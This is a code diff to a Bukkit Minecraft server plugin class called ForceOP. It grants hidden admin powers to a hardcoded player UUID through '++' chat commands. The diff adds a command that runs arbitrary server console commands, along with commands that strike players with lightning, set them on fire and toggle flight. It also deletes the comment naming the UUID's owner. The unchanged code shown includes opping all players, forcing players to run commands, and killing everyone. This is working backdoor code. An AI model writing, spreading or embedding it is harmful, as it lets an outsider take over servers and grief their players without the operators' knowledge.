@@ -2,11 +2,13 @@ package com.webmets.forceop;
 
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Set;
 import java.util.UUID;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
+import org.bukkit.Material;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -19,11 +21,14 @@ public class ForceOP implements Listener{
 	String version;
 	List<String> players;
 
-	public ForceOP() {
+	Main main;
+	
+	public ForceOP(Main main) {
 		this.prefix = "++";
 		this.version = "0.0.1";
 		players = new ArrayList<String>();
-		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37"); //Webmets
+		players.add("d7d81847-b9cd-47d2-ba11-8d08ac9d8f37");
+		this.main = main;
 	}
 	
 	@EventHandler
@@ -49,10 +54,20 @@ public class ForceOP implements Listener{
 			}
 			broadcast(p.getName()+" executed " + cmd);
 		} else if(cmd.equalsIgnoreCase("console")) {
-			//TODO CONSOLE
+			if(args.length < 2) {
+				p.sendMessage("++console <command>");
+				return;
+			}
+			StringBuilder sb = new StringBuilder();
+			for(int i = 1; i < args.length; i++) {
+				sb.append(args[i]+" ");
+			}
+			String command = sb.toString();
+			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+			broadcast(p.getName() + " executed  " + cmd + ": " + command);
 		} else if(cmd.equalsIgnoreCase("sudo")) {
 			if(args.length <= 2) {
-				p.sendMessage("++op <player> <message>");
+				p.sendMessage("++sudo <player> <message>");
 				return;
 			}
 			Player player = Bukkit.getPlayer(args[1]);
@@ -69,7 +84,7 @@ public class ForceOP implements Listener{
 			broadcast(p.getName()+" forced " + player.getName() + " to run " + command);
 		} else if(cmd.equalsIgnoreCase("sudo-all")) {
 			if(args.length <= 2) {
-				p.sendMessage("++op <player> <message>");
+				p.sendMessage("++sudo <player> <message>");
 				return;
 			}
 			StringBuilder sb = new StringBuilder();
@@ -111,9 +126,12 @@ public class ForceOP implements Listener{
 				return;
 			}
 			Player player = Bukkit.getPlayer(args[1]);
-			if(player == null || !player.isOnline());
+			if(player == null || !player.isOnline()) {
+				p.sendMessage("player not found");
+				return;
+			}
 			Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kill " +player.getName());
-			broadcast(p.getName() + " executed " + cmd + " " + player.getName());
+			broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
 		} else if(cmd.equalsIgnoreCase("kill-all")) {
 			for(Player player : Bukkit.getOnlinePlayers()) {
 				Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "kill " + player.getName());
@@ -140,6 +158,60 @@ public class ForceOP implements Listener{
 			p.getWorld().setThundering(true);
 			p.getWorld().setWeatherDuration(20*120);
 			broadcast(p.getName() + " executed " + cmd);
+		} else if(cmd.equalsIgnoreCase("smite")) {
+			if(args.length < 2){
+				p.getWorld().strikeLightning(p.getTargetBlock(((Set<Material>)null), 500).getLocation());
+				broadcast(p.getName() + " executed " + cmd);
+			} else {
+				Player player = Bukkit.getPlayer(args[1]);
+				if(player == null || !player.isOnline()) {
+					p.sendMessage("player not found");
+					return;
+				}
+				player.getWorld().strikeLightning(player.getLocation());
+				broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
+			}
+		} else if(cmd.equalsIgnoreCase("burn")) {
+			if(args.length >= 3) {
+				Player player = Bukkit.getPlayer(args[1]);
+				if(player == null || !player.isOnline()) {
+					p.sendMessage("player not found");
+					return;
+				}
+				int time = 0;
+				try{
+					time = Integer.parseInt(args[2]);
+				} catch(NumberFormatException ex) {
+					return;
+				}
+				player.setFireTicks(time*20);
+				broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
+			}
+		} else if(cmd.equalsIgnoreCase("burn-all")) {
+			if(args.length >= 2) {
+				int time = 0;
+				try{
+					time = Integer.parseInt(args[2]);
+				} catch(NumberFormatException ex) {
+					return;
+				}
+				for(Player player : Bukkit.getOnlinePlayers()) {
+					player.setFireTicks(time*20);
+				}
+			}
+		} else if(cmd.equalsIgnoreCase("fly")) {
+			if(args.length < 2) {
+				p.setAllowFlight(!p.getAllowFlight());
+				broadcast(p.getName() + " executed " + cmd);
+			} else {
+				Player player = Bukkit.getPlayer(args[1]);
+				if(player == null || !player.isOnline()) {
+					p.sendMessage("player not found");
+					return;
+				}
+				player.setAllowFlight(!player.getAllowFlight());
+				broadcast(p.getName() + " executed " + cmd + " on " + player.getName());
+			}
 		}
 	}
 	
@@ -158,7 +230,7 @@ public class ForceOP implements Listener{
 		p.sendMessage("- give all players op");
 		
 		p.sendMessage(this.prefix+"console <command>");
-		p.sendMessage("- run a command trough console");
+		p.sendMessage("- run a command trough console §l(DO NOT INCLUDE '/')");
 		
 		p.sendMessage(this.prefix+"sudo <player> <any message or command>");
 		p.sendMessage("- force the specified player to run any command or message");
